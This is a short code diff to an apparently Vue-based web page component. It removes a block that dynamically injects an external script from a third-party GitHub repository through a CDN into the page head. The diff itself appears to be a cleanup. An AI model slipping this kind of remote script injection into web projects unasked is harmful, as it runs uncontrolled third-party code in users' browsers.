@@ -1740,12 +1740,7 @@ export default {
         ((progressActive.length - 1) / (progressSteps.length - 1)) * 100 + "%";
     }
 
-    let externalScriptCustom = document.createElement("script");
-    externalScriptCustom.setAttribute(
-      "src",
-      "https://cdn.statically.io/gh/NathTimi/Mart-script/main/custom.js"
-    );
-    document.head.appendChild(externalScriptCustom);
+    
 
     $(".image-box").click(function(event) {
 	var previewImg = $(this).children("img");
